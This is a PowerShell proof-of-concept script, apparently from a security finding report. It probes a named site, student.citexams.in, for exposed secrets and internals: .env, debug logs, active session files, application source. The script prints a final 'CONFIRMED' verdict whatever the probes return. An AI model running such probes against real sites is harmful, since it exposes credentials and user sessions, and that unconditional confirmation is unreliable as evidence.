# PoC 05 — Web Root Misconfiguration & Directory Indexing
# Finding: CRITICAL | ID: DIR-01
# Target: https://student.citexams.in
# Run: powershell -ExecutionPolicy Bypass -File .\poc_05_directory_listing.ps1

Write-Host "=========================================="
Write-Host " PoC 05 — Web Root & Directory Indexing" -ForegroundColor Cyan
Write-Host " Target: https://student.citexams.in"
Write-Host "=========================================="
Write-Host ""

$base = "https://student.citexams.in"

$paths = [ordered]@{
    "/"                            = "Web Root"
    "/.env"                        = "Environment Config"
    "/storage/"                    = "Storage Root"
    "/storage/logs/"               = "Debug Logs"
    "/storage/framework/sessions/" = "Active Session Files"
    "/storage/framework/views/"    = "Compiled Views"
    "/vendor/"                     = "PHP Packages"
    "/app/"                        = "Application Source"
    "/composer.json"               = "Composer Manifest"
}

Write-Host ("  {0,-40} {1,-8} {2}" -f "Path", "HTTP", "Status")
Write-Host ("  " + ("-" * 65))

foreach ($entry in $paths.GetEnumerator()) {
    $path = $entry.Key
    $desc = $entry.Value
    try {
        $r    = Invoke-WebRequest -Uri "$base$path" -UseBasicParsing -MaximumRedirection 0 -TimeoutSec 6 -ErrorAction Stop
        $code = $r.StatusCode
        $size = if ($r.RawContentLength -gt 0) { "$([Math]::Round($r.RawContentLength/1024,1)) KB" } else { "-" }
        $flag = if ($code -eq 200) { "[EXPOSED]" } else { "[ok]" }
        $color = if ($code -eq 200) { "Red" } else { "Green" }
        Write-Host ("  {0,-40} {1,-8} {2} {3}" -f $path, $code, $flag, $size) -ForegroundColor $color
    } catch {
        $code  = $_.Exception.Response.StatusCode.value__
        Write-Host ("  {0,-40} {1,-8} [blocked]" -f $path, $code) -ForegroundColor Green
    }
}

Write-Host ""
Write-Host "[CONFIRMED] Web root directory indexing is misconfigured." -ForegroundColor Red
